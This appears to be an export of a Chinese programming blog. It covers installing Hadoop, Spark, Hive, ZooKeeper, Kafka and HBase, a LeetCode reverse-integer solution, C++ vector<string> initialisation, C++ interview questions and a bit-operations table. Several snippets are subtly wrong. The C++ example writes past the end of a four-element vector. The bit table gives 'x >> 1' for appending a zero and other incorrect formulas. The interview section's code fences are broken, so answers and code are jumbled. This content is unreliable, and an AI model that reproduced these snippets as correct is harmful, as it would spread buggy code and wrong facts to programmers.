<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.application.classpath<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>$HADOOP_HOME/share/hadoop/mapreduce/*:$HADOOP_HOME/share/hadoop/mapreduce/lib/*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>etc/hadoop/yarn-site.xml:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.env-whitelist<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAPRED_HOME<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>启动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sbin/start-yarn.sh</span><br></pre></td></tr></table></figure>
<h2 id="2-安装Spark"><a href="#2-安装Spark" class="headerlink" title="2 安装Spark"></a>2 安装Spark</h2><p>有了前面这么多的准备工作，终于可以安装Spark了。到<a href="http://spark.apache.org/downloads.html">Spark官网</a>下载你需要的Spark版本，注意这里我们看到需要有依赖的Hadoop，而且还让你选择Hadoop的版本，这里默认即可。下载完直接双击压缩包就会解压，将其重命名为<code>spark</code>放到<code>/opt</code>下面。</p>
<p>毫无疑问，我们还需要一个环境参数配置，打开<code>~/.zshrc</code>添加</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SPARK_HOME=/opt/spark</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$SPARK_HOME</span>/bin</span><br></pre></td></tr></table></figure>
<p>走到这一步，我们终于可以启动spark了，打开终端，输入<code>spark-shell --master local</code>, OK</p>
<h2 id="3-安装-Hive"><a href="#3-安装-Hive" class="headerlink" title="3 安装 Hive"></a>3 安装 Hive</h2><p>下载<a href="http://hive.apache.org/downloads.html">hive</a>后解压到指定目录，并添加路径</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HIVE_HOME=/opt/apache-hive-x.y.z-bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$HIVE_HOME</span>/bin</span><br></pre></td></tr></table></figure>
<p>这样，初步安装就完成了，键入hive启动 hive shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hive hive&gt;</span><br></pre></td></tr></table></figure>
<h2 id="4-安装Zookeaper"><a href="#4-安装Zookeaper" class="headerlink" title="4 安装Zookeaper"></a>4 安装Zookeaper</h2><p>到<a href="https://zookeeper.apache.org/releases.html#download">官网</a>下载zookeaper。</p>
<p>使用Zookeeper之前，需要有一个配置文件<code>conf/zoo.cfg</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tickTime=2000</span><br><span class="line">dataDir=/tmp/zookeeper</span><br><span class="line">clientPort=2181</span><br></pre></td></tr></table></figure>
<p>启动Zookeeper</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/zkServer.sh start</span><br></pre></td></tr></table></figure>
<h2 id="5-安装Kafka"><a href="#5-安装Kafka" class="headerlink" title="5 安装Kafka"></a>5 安装Kafka</h2><p>Kafka使用了scala和java语言，所以应该首先安装scala。到<a href="https://www.scala-lang.org/download/">scala官网</a>下载scala，选择<code>Other ways to install Scala</code>，点击下载binary。</p>
<p>到<a href="http://kafka.apache.org/downloads">kafka官网</a>下载kafaka，注意选择对应的scala版本。</p>
<h2 id="6-安装HBase"><a href="#6-安装HBase" class="headerlink" title="6 安装HBase"></a>6 安装HBase</h2><p>到<a href="http://hbase.apache.org/downloads.html">官网</a>下载Hbase，解压并设置好路径。</p>
<p>首先配置<code>conf/hbase-env.sh</code>文件，设置JAVA_HOME为正确的JAVA版本，设置export HBASE_MANAGES_ZK=false，使用我们自己的zookeeper。</p>
<p>配置<code>conf/hbase.site</code>文件，如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.cluster.distributed<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.rootdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://localhost:9000/hbase<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.property.dataDir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/tmp/zookeeper<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>hbase.rootdir</code>为hbase的根目录，参见Hadoop中coresite.xml文件，即配置的端口号。</p>
<blockquote>
<p>站点： <a href="http://localhost:16010/">http://localhost:16010/</a></p>
</blockquote>
<h2 id="7-最简便的安装方式"><a href="#7-最简便的安装方式" class="headerlink" title="7 最简便的安装方式"></a>7 最简便的安装方式</h2><p>其实最简单的安装莫过于Vagrant方案了，搭建Vagrant虚拟机的过程见我的博文<a href="http://larryim.cc/wiki/2017/12/30/awesome-Install-环境-vagrant搭建ubuntu/">vagrant搭建ubuntu</a>，在选择配置文件的时候，选择这里的<a href="https://github.com/datacell/bigdatabase/tree/bartemius_v1.0.0/scripts/boxes/bartemius/1.0.0/Vagrantfile">配置文件</a>。下载好配置文件后，在终端切换到配置文件所在文件夹，输入命令行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vagrant up</span><br><span class="line">vagrant ssh</span><br></pre></td></tr></table></figure>
<p>即可使用。当然使用其他的源或配置也可以，读者可以寻找适合自己的。</p>
<h2 id="8-IntelliJ-IDEA"><a href="#8-IntelliJ-IDEA" class="headerlink" title="8 IntelliJ IDEA"></a>8 IntelliJ IDEA</h2><p>选择【File-Project Structure】, 点击左侧【Modules】，在右边切换到【Dependencies】选项卡，添加Hadoop的路径： </p>
<ul>
<li>点击【+】，选择第一项（1 JARS or directories）</li>
<li>添加 share/hadoop/common，share/hadoop/common/lib，share/hadoop/hdfs，/share/hadoop/yarn，share/hadoop/mapreduce；</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/hadoopIDEA.png" alt="hadoopIDEA"></p>
]]></content>
      
        <categories>
            
            <category> awesome Install </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[7. Reverse Integer]]></title>
      <url>/wiki/2017/09/01/Leetcode-7-Reverse-Integer/</url>
      <content type="html"><![CDATA[<p>Given a 32-bit signed integer, reverse digits of an integer.</p>
<p><strong>Example 1</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 123</span><br><span class="line">Output:  321</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: -123</span><br><span class="line">Output: -321</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 120</span><br><span class="line">Output: 21</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:<br>Assume we are dealing with an environment which could only hold integers within the 32-bit signed integer range. For the purpose of this problem, assume that your function returns 0 when the reversed integer overflows.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>我们可以一次构建反转整数的一位数字：每次弹出和推入一个数字。</p>
<ul>
<li>弹出数字： <code>tail = x%10; x = x/10</code></li>
<li>推入数字： <code>newResult = newResult*10 + tail</code></li>
</ul>
<p>难点在于如何判断溢出。官方的解答非常繁琐，其实有一种直接的方法：能不能再转换回原数字</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((newResult - tail) / <span class="number">10</span> != result) <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>如果<code>newResult</code>溢出，肯定不能再转换回去了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> tail = x % <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">int</span> newResult = result * <span class="number">10</span> + tail;</span><br><span class="line">        <span class="comment">// check overflow</span></span><br><span class="line">        <span class="keyword">if</span> ((newResult - tail) / <span class="number">10</span> != result) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        result = newResult;</span><br><span class="line">        x = x / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但上述方法是一种trick，在其他情况下应用不好。而且要反复做除法，效率也比较低。下面是我想到的比较通用的一种解法，借鉴自Java库<code>Integer.parseInt()</code>中处理溢出的方法(详见本博客LeetCode 8. String to Integer (atoi)):</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> isPositive = x &gt; <span class="number">0</span> ? <span class="keyword">true</span> : <span class="keyword">false</span>; <span class="comment">// 是否是整数</span></span><br><span class="line">    <span class="keyword">int</span> limit = isPositive ? Integer.MIN_VALUE : -Integer.MAX_VALUE; <span class="comment">// 数字下限</span></span><br><span class="line">    x = isPositive ? x : -x; <span class="comment">// 转化为正数</span></span><br><span class="line">    <span class="keyword">int</span> multmin = limit / <span class="number">10</span>; <span class="comment">// 数字下限：用来判断乘法溢出</span></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>; <span class="comment">// 数字反转结果</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>; <span class="comment">// index</span></span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> tail = x % <span class="number">10</span>;</span><br><span class="line">        <span class="comment">// returns 0 when the reversed integer overflows.</span></span><br><span class="line">        <span class="keyword">if</span> (result &lt; multmin) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        result *= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// returns 0 when the reversed integer overflows.</span></span><br><span class="line">        <span class="keyword">if</span> (result &lt; limit + tail) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        result -= tail;</span><br><span class="line"></span><br><span class="line">        x = x / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> isPositive ? - result : result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> x&lt;<span class="number">0</span>:</span><br><span class="line">            quotient = -x</span><br><span class="line">            flag = <span class="number">-1</span></span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            quotient = x</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">        reverse = []</span><br><span class="line">        scale = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> quotient != <span class="number">0</span>:</span><br><span class="line">            quotient, mod = divmod(quotient, <span class="number">10</span>)</span><br><span class="line">            print(quotient, mod)</span><br><span class="line">            reverse.append(mod)</span><br><span class="line">            scale *= <span class="number">10</span></span><br><span class="line">        </span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reverse:</span><br><span class="line">            scale /= <span class="number">10</span></span><br><span class="line">            result += scale*i</span><br><span class="line">            </span><br><span class="line">        result = int(result*flag)</span><br><span class="line">        <span class="keyword">if</span> result &lt; <span class="number">-2147483647</span><span class="number">-1</span> <span class="keyword">or</span> result &gt; <span class="number">2147483647</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(self, x)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type x: int</span></span><br><span class="line"><span class="string">    :rtype: int</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    sign = <span class="keyword">lambda</span> x: x <span class="keyword">and</span> (<span class="number">1</span>, <span class="number">-1</span>)[x &lt; <span class="number">0</span>]</span><br><span class="line">    r = int(str(sign(x)*x)[::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">return</span> (sign(x)*r, <span class="number">0</span>)[r &gt; <span class="number">2</span>**<span class="number">31</span> - <span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>记住<code>2147483647</code></p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[STL中的vector<string>总结]]></title>
      <url>/wiki/2017/08/17/C-Vector-string/</url>
      <content type="html"><![CDATA[<p>vector<string>在C++编程中经常会被使用。</p>
<p>##初始化</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// push_back的方式</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; str1(<span class="number">4</span>);</span><br><span class="line">    str1.push_back(<span class="string">"a"</span>);</span><br><span class="line">    str1.push_back(<span class="string">"b"</span>);</span><br><span class="line">    str1.push_back(<span class="string">"c"</span>);</span><br><span class="line">    str1.push_back(<span class="string">"d"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 类似于数组的方式</span></span><br><span class="line">    <span class="built_in">vector</span> &lt;<span class="built_in">string</span>&gt; str2(<span class="number">4</span>);</span><br><span class="line">    str2[<span class="number">1</span>] = <span class="string">"a"</span>;</span><br><span class="line">    str2[<span class="number">2</span>] = <span class="string">"b"</span>;</span><br><span class="line">    str2[<span class="number">3</span>] = <span class="string">"c"</span>;</span><br><span class="line">    str2[<span class="number">4</span>] = <span class="string">"d"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用构造函数的方式</span></span><br><span class="line">    <span class="built_in">string</span> str3[] = &#123;<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>, <span class="string">"d"</span>&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; v(str3, str3+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> C++ </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Cpp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[C++面试经典100题]]></title>
      <url>/wiki/2017/08/17/C-C-%E9%9D%A2%E8%AF%95%E7%BB%8F%E5%85%B8100%E9%A2%98/</url>
      <content type="html"><![CDATA[<h2 id="1-请填写BOOL-float-指针变量与“零值”比较的-if-语句"><a href="#1-请填写BOOL-float-指针变量与“零值”比较的-if-语句" class="headerlink" title="1. 请填写BOOL , float, 指针变量与“零值”比较的 if 语句"></a>1. 请填写BOOL , float, 指针变量与“零值”比较的 if 语句</h2><p>提示：这里“零值”可以是0, 0.0 , <code>FALSE</code> 或者“空指针”。例如 <code>int</code> 变量 $n$ 与“零值”<br>比较的<code>if</code>语句为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( n == 0 )</span><br><span class="line">if ( n != 0 )</span><br></pre></td></tr></table></figure>
<p>以此类推。</p>
<p>(1)请写出 BOOL flag 与“零值”比较的 if 语句：<br>标准答案：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( flag )</span><br><span class="line">if ( !flag )</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">如下写法均属不良风格，不得分。</span><br></pre></td></tr></table></figure>
<p>if (flag == TRUE)<br>if (flag == 1 )<br>if (flag == FALSE)<br>if (flag == 0)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(2)请写出 `float x` 与“零值”比较的`if`语句：</span><br><span class="line">标准答案示例：</span><br></pre></td></tr></table></figure></p>
<p>const float EPSINON = 0.00001;<br>if ((x &gt;= - EPSINON) &amp;&amp; (x &lt;= EPSINON)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">不可将浮点变量用`==`或`！=`与数字比较，应该设法转化成`&gt;=`或`&lt;=`此</span><br><span class="line">类形式。</span><br><span class="line">如下是错误的写法，不得分。</span><br></pre></td></tr></table></figure></p>
<p>if (x == 0.0)<br>if (x != 0.0)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(3)请写出 `char *p` 与“零值”比较的 `if` 语句：</span><br><span class="line">标准答案：对于空指针值，用`#NULL` 表示</span><br></pre></td></tr></table></figure></p>
<p>if (p == NULL)<br>if (p != NULL)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">如下写法均属不良风格，不得分。</span><br></pre></td></tr></table></figure></p>
<p>if (p == 0)<br>if (p != 0)<br>if (p)<br>if (!)<br>```</p>
<h2 id="2-32位C-程序，计算sizeof的值"><a href="#2-32位C-程序，计算sizeof的值" class="headerlink" title="2.32位C++程序，计算sizeof的值"></a>2.32位C++程序，计算sizeof的值</h2><p><img src="media/15066079292359/15066082580402.jpg" alt=""></p>
<p><code>sizeof(str) = 6</code>; //字符串数组，大小是六个字节(加上’\0’共六个)。<br><code>sizeof(p) = 4</code>; // 指针的内容就是一个指向目标地址的整数，所以不管指向<code>char</code>、<code>int</code>还是其他，32位机指针一律是4个字节。</p>
<p><code>sizeof(n) = 4</code>; // <code>int</code>型变量是4个字节。<br>右侧：<br><code>sizeof(str) = 4</code>; // 这里的str不再是100字节。当数组作为函数的参数进行传递时，也就是作为参数入栈，那么该数组自动退化成同类型的指针。<br><code>sizeof(p) = 4</code>; // 同样，指针类型一律4个字节。</p>
<h2 id="3-long-a-0x801010-a-5"><a href="#3-long-a-0x801010-a-5" class="headerlink" title="3. long a=0x801010; a+5=?"></a>3. long a=0x801010; a+5=?</h2><p>0x801010 用二进制表示 为：“ 1000 0000 0001 0000 0001 0000” ，十进制的值为 8392720 ，再加 上 5 就是 8392725 。</p>
<p>##4. 用变量 <code>a</code> 给出下面的定义</p>
<ul>
<li>一个有 10 个指针的数组，该指针是指向一个整型数的;</li>
<li>一个指向有 10 个整型数数组的指针 ;</li>
<li>一个指向函数的指针，该函数有一个整型参数并返 回一个整型数 ;</li>
<li><p>一个有 10 个指针的数组，该指针指向一个函数，该 函数有一个整型参数并返回一个整型数 ;</p>
</li>
<li><p>int * a[10]; </p>
</li>
<li>int (*a)[10]</li>
<li>int (*a)(int); </li>
<li>int (*a[10])(int)</li>
</ul>
]]></content>
      
        <categories>
            
            <category> C++ </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Cpp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[位操作]]></title>
      <url>/wiki/2017/08/17/Algorithm-%E4%BD%8D%E6%93%8D%E4%BD%9C/</url>
      <content type="html"><![CDATA[<h2 id="下面列举了一些常见的二进制位的变换操作。"><a href="#下面列举了一些常见的二进制位的变换操作。" class="headerlink" title="下面列举了一些常见的二进制位的变换操作。"></a>下面列举了一些常见的二进制位的变换操作。</h2><pre><code>功能              |           示例            |    位运算
</code></pre><p>———————|—————————|————-<br>去掉最后一位          | (101101-&gt;10110)           | x &gt;&gt; 1<br>在最后加一个0         | (101101-&gt;1011010)         | x &gt;&gt; 1<br>在最后加一个1         | (101101-&gt;1011011)         | x &lt;&lt; 1+1<br>把最后一位变成1       | (101100-&gt;101101)          | x or 1<br>把最后一位变成0       | (101101-&gt;101100)          | x or 1-1<br>最后一位取反          | (101101-&gt;101100)          | x xor 1<br>把右数第k位变成1      | (101001-&gt;101101,k=3)      | x or (1 &lt;&lt; (k-1))<br>把右数第k位变成0      | (101101-&gt;101001,k=3)      | x and not (1 &lt;&lt; (k-1))<br>右数第k位取反         | (101001-&gt;101101,k=3)      | x xor (1 &lt;&lt; (k-1))<br>取末三位              | (1101101-&gt;101)            | x and 7<br>取末k位               | (1101101-&gt;1101,k=5)       | x and (1 &lt;&lt; k-1)<br>取右数第k位           | (1101101-&gt;1,k=4)          | x &gt;&gt; (k-1) and 1<br>把末k位变成1          | (101001-&gt;101111,k=4)      | x or (1 &lt;&lt; k-1)<br>末k位取反             | (101001-&gt;100110,k=4)      | x xor (1 &lt;&lt; k-1)<br>把右边连续的1变成0    | (100101111-&gt;100100000)    | x and (x+1)<br>把右起第一个0变成1    | (100101111-&gt;100111111)    | x or (x+1)<br>把右边连续的0变成1    | (11011000-&gt;11011111)      | x or (x-1)<br>取右边连续的1         | (100101111-&gt;1111)         | (x xor (x+1)) &gt;&gt; 1<br>去掉右起第一个1的左边 | (100101000-&gt;1000)         | x and (x xor (x-1))</p>
